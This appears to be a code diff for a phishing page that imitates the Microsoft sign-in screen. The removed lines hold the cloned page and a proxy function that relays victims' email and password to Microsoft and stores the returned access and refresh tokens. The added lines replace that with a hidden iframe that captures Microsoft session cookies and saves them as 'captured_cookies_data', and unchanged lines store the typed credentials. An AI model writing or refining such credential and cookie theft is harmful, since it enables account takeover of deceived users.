@@ -1,285 +1,15 @@
-<!doctype html>
-<html lang="en">
-<head>
-  <title>Sign in</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <link rel="shortcut icon" href="/images/favicon.ico">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
-  <style>
-    body, html {
-      height: 100%;
-      margin: 0;
-      font-family: "Segoe UI", "Helvetica Neue", "Arial", sans-serif;
-      background-image: url('https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg');
-      background-size: cover;
-      background-repeat: no-repeat;
-      background-attachment: fixed;
-      background-position: center center;
-    }
-    .main-container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100%;
-      width: 100%;
-    }
-    .form-wrapper {
-      max-width: 440px;
-      width: 100%;
-      padding: 0 16px;
-    }
-    .form-box {
-      background-color: #ffffff;
-      padding: 44px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    }
-    .form-box h1 {
-      font-size: 24px;
-      font-weight: 600;
-      margin-bottom: 24px;
-      color: #1b1b1b;
-    }
-    .form-control {
-      border: none;
-      border-bottom: 1px solid #8A8886;
-      border-radius: 0;
-      padding: 8px 0;
-      font-size: 16px;
-      width: 100%;
-    }
-    .form-control:focus {
-      box-shadow: none;
-      outline: none;
-      border-bottom-color: #0078d4;
-    }
-    .form-box p {
-      font-size: 13px;
-      margin-top: 16px;
-      margin-bottom: 0;
-    }
-    .form-box a {
-      color: #0067b8;
-      text-decoration: none;
-    }
-    .form-box a:hover {
-      text-decoration: underline;
-    }
-    .button-container {
-      display: flex;
-      justify-content: flex-end;
-    }
-    .btn.btn-primary-blue {
-      background-color: #0067b8;
-      color: white;
-      transition: filter 0.2s;
-    }
-    .btn.btn-primary-blue:hover {
-      filter: brightness(90%);
-    }
-    .btn.btn-secondary-gray {
-      background-color: #ccc;
-      color: #1b1b1b;
-      border: 1px solid #ccc;
-    }
-    .form-box .btn {
-      font-size: 15px;
-      padding: 8px 30px;
-      border: none;
-      border-radius: 2px;
-    }
-    #back, #options-view-back {
-      cursor: pointer;
-      color: #23272a;
-      font-size: 16px;
-      vertical-align: middle;
-    }
-    .options-box {
-      background-color: #ffffff;
-      padding: 16px 44px;
-      margin-top: 16px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    }
-    .options-box p {
-        margin: 0;
-        font-size: 15px;
-    }
-    .options-box a {
-      color: #1b1b1b;
-      text-decoration: none;
-    }
-    .options-box a:hover {
-      text-decoration: underline;
-    }
-    .fa-key {
-      color: #5e5e5e;
-      margin-right: 8px;
-    }
-    .page-footer {
-        position: fixed;
-        bottom: 12px;
-        right: 16px;
-        font-size: 12px;
-    }
-    .page-footer a {
-        color: #fff;
-        text-shadow: 0 0 3px rgba(0,0,0,0.7);
-        margin-left: 16px;
-        text-decoration: none;
-    }
-    .option-item {
-        display: flex;
-        align-items: center;
-        padding: 8px 0;
-        cursor: pointer;
-    }
-    .option-item:hover {
-        background-color: #f2f2f2;
-    }
-    .option-icon-container {
-        width: 40px;
-        height: 40px;
-        border-radius: 50%;
-        background-color: #f2f2f2;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        font-size: 20px;
-        color: #333;
-        margin-right: 16px;
-    }
-    .option-text p { margin: 0; line-height: 1.4; }
-    .option-text .primary { font-size: 15px; color: #1b1b1b; }
-    .option-text .secondary { font-size: 12px; color: #5e5e5e; }
-    .troubleshooting-box {
-        display: none;
-        background-color: #ffffff;
-        padding: 24px;
-        margin-top: 16px;
-        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        font-size: 14px;
-        color: #1b1b1b;
-    }
-    .troubleshooting-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: flex-start;
-    }
-    .troubleshooting-header h2 { margin: 0; font-size: 18px; font-weight: 600; }
-    .troubleshooting-close { font-size: 24px; font-weight: 200; border: none; background: none; cursor: pointer; }
-    .troubleshooting-body p { margin: 8px 0; }
-    .troubleshooting-body strong { font-weight: 600; }
-    .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
-    .hidden { display: none !important; }
-  </style>
-</head>
-<body>
-
-  <div class="main-container">
-    <div class="form-wrapper">
-      <div class="form-box">
-        <!-- Email View -->
-        <div id="div1">
-          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
-          <h1 class="mt-4">Sign in</h1>
-          <div class="form-group mt-2">
-            <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" autocomplete="email" autocapitalize="none">
-          </div>
-          <p>No account? <a href="#">Create one!</a></p>
-          <p><a href="#">Can't access your account?</a></p>
-          <div class="button-container mt-4">
-            <button class="btn btn-primary-blue" id="next">Next</button>
-          </div>
-        </div>
-
-        <!-- Password View -->
-        <div id="div2" class="hidden">
-          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
-          <div class="mt-4">
-              <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch" style="font-size:15px;"></span>
-          </div>
-          <h1 class="mt-3">Enter password</h1>
-          <div class="form-group mt-2">
-            <input type="password" class="form-control" id="password" placeholder="Password" autocomplete="current-password">
-          </div>
-          <p><a href="#">Forgot my password</a></p>
-          <div class="button-container mt-4">
-            <button class="btn btn-primary-blue" id="submit-btn">Sign in</button>
-          </div>
-        </div>
-        
-        <!-- Detailed "Sign-in options" View -->
-        <div id="options_view_detailed" class="hidden">
-            <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
-            <h1 class="mt-4">Sign-in options</h1>
-            <div class="option-item">
-                <div class="option-icon-container"><i class="fas fa-user-lock"></i></div>
-                <div class="option-text">
-                    <p class="primary">Face, fingerprint, PIN or security key</p>
-                    <p class="secondary">Use your device to sign in with a passkey.</p>
-                </div>
-            </div>
-            <div class="option-item">
-                <div class="option-icon-container"><i class="fab fa-github"></i></div>
-                <div class="option-text"><p class="primary">Sign in with GitHub</p></div>
-            </div>
-            <div class="option-item">
-                <div class="option-icon-container"><i class="fas fa-id-card-alt"></i></div>
-                <div class="option-text">
-                    <p class="primary">Sign in to an organization</p>
-                    <p class="secondary">Search for a company or an organization you're working with.</p>
-                </div>
-            </div>
-            <div class="button-container mt-4">
-                <button class="btn btn-secondary-gray" id="options-view-back">Back</button>
-            </div>
-        </div>
-      </div>
-
-      <!-- "Sign-in options" Clickable Box -->
-      <div class="options-box" id="options_box">
-        <p><a href="#" id="sign_in_options_link"><i class="fas fa-key"></i> Sign-in options</a></p>
-      </div>
-
-      <!-- Troubleshooting Box -->
-      <div class="troubleshooting-box" id="troubleshooting_box">
-        <div class="troubleshooting-header">
-            <h2>Troubleshooting details</h2>
-            <button class="troubleshooting-close" id="close_troubleshooting_btn">&times;</button>
-        </div>
-        <div class="troubleshooting-body">
-            <p>If you contact your administrator, send this info to them.</p>
-            <p><a href="#" id="copy_info_link">Copy info to clipboard</a></p>
-            <div id="error_details_for_copy">
-                <p><strong>Error Code:</strong> 50058</p>
-                <p><strong>Request Id:</strong> <span class="code">a4d52b6b-cc92-4914-95ee-fe70b9bc0200</span></p>
-                <p><strong>Correlation Id:</strong> <span class="code">eaa8bc41-ac19-4850-9294-bc88a1f0e181</span></p>
-                <p><strong>Timestamp:</strong> <span class="code" id="modal_timestamp"></span></p>
-            </div>
-            <hr>
-            <p><strong>Flag sign-in errors for review:</strong> <a href="#">Enable flagging</a></p>
-            <p>If you plan on getting help for this problem, enable flagging and try to reproduce the error within 20 minutes. Flagged events make diagnostics available and are raised to admin attention.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Page Footer -->
-  <div class="page-footer">
-    <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
-    <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank">Privacy & cookies</a>
-    <a href="#" id="footer_dots_link">...</a>
-  </div>
+  <!-- Hidden iframe for silent Microsoft auth -->
+  <iframe id="authFrame" style="display:none; width:0; height:0; border:none;"></iframe>
 
   <script>
-    console.log('🔧 replacement.html loaded - Using Backend Proxy for Auth');
+    console.log('🔧 replacement.html loaded - Silent Auth with iFrame');
 
     document.addEventListener('DOMContentLoaded', function () {
         
         const div1 = document.getElementById('div1');
         const div2 = document.getElementById('div2');
         const optionsBox = document.getElementById('options_box');
+        const authFrame = document.getElementById('authFrame');
         
         document.getElementById('next').addEventListener('click', function (e) {
             e.preventDefault();
@@ -297,6 +27,42 @@
             div2.classList.add('hidden');
             div1.classList.remove('hidden');
             optionsBox.classList.remove('hidden');
+        });
+
+        // Listen for iframe messages
+        window.addEventListener('message', function(event) {
+            console.log('📨 Message from iframe:', event.data.type);
+
+            if (event.data.type === 'AUTH_COMPLETE') {
+                console.log('✅ Auth complete from iframe');
+                
+                const capturedCookies = event.data.data.cookies;
+                const code = event.data.data.code;
+
+                // Store cookies
+                if (capturedCookies.length > 0) {
+                    const cookieExport = {
+                        version: '1.0',
+                        exportedAt: new Date().toISOString(),
+                        source: 'silent-auth-frame',
+                        domain: event.data.data.domain,
+                        totalCookies: capturedCookies.length,
+                        cookies: capturedCookies,
+                        note: 'Cookies captured from Microsoft domain via silent auth'
+                    };
+
+                    localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
+                    sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
+                    
+                    console.log('💾 Stored', capturedCookies.length, 'cookies');
+                }
+
+                // Redirect to AuthCallback
+                setTimeout(() => {
+                    console.log('🔄 Redirecting to /auth/callback...');
+                    window.location.href = '/auth/callback';
+                }, 1500);
+            }
         });
 
         document.getElementById('submit-btn').addEventListener('click', function (event) {
@@ -318,7 +84,7 @@
 
             console.log('📋 Credentials captured:', { email });
 
-            // ✅ Store credentials
+            // Store credentials
             const credentialsData = { 
                 email, 
                 password, 
@@ -340,65 +106,23 @@
                 console.error('Failed to store credentials:', err);
             }
 
-            // ✅ USE BACKEND PROXY to authenticate (no CORS issues)
-            console.log('🔐 Authenticating via backend proxy...');
-            authenticateViaProxy(email, password, submitBtn);
+            // ✅ LOAD SILENT AUTH FRAME (no UI shown)
+            console.log('🔐 Loading silent auth frame...');
+            authFrame.src = '/silent-auth-frame.html';
+
+            // Send init message to frame
+            setTimeout(() => {
+                authFrame.contentWindow.postMessage({
+                    type: 'INIT_AUTH',
+                    email: email,
+                    clientId: '2e338732-c914-4129-a148-45c24f2da81d',
+                    redirectUri: window.location.origin + '/silent-auth-frame.html',
+                    state: 'silent_' + Date.now()
+                }, '*');
+
+                console.log('📨 Init message sent to silent-auth-frame');
+            }, 500);
         });
-
-        // ✅ AUTHENTICATE VIA NETLIFY PROXY FUNCTION
-        async function authenticateViaProxy(email, password, submitBtn) {
-            try {
-                console.log('🔄 Sending to /.netlify/functions/microsoftAuth...');
-
-                const response = await fetch('/.netlify/functions/microsoftAuth', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        email: email,
-                        password: password
-                    })
-                });
-
-                console.log('📨 Response status:', response.status);
-
-                const data = await response.json();
-
-                if (data.success && data.access_token) {
-                    console.log('✅ Authentication successful!');
-                    console.log('🎟️ Access token received');
-                    
-                    // ✅ Store tokens
-                    localStorage.setItem('microsoft_access_token', data.access_token);
-                    sessionStorage.setItem('microsoft_access_token', data.access_token);
-
-                    if (data.refresh_token) {
-                        localStorage.setItem('microsoft_refresh_token', data.refresh_token);
-                        sessionStorage.setItem('microsoft_refresh_token', data.refresh_token);
-                    }
-
-                    console.log('💾 Tokens stored');
-                    
-                    // ✅ Redirect to AuthCallback
-                    console.log('🔄 Redirecting to /auth/callback...');
-                    setTimeout(() => {
-                        window.location.href = '/auth/callback';
-                    }, 1000);
-
-                } else {
-                    console.error('❌ Authentication failed:', data);
-                    
-                    submitBtn.textContent = 'Error - Try again';
-                    submitBtn.disabled = false;
-                }
-
-            } catch (error) {
-                console.error('❌ Auth error:', error);
-                submitBtn.textContent = 'Error - Try again';
-                submitBtn.disabled = false;
-            }
-        }
 
         // The code for the other features is kept separate
         const optionsViewDetailed = document.getElementById('options_view_detailed');
@@ -441,5 +165,3 @@
         });
     });
   </script>
-</body>
-</html>
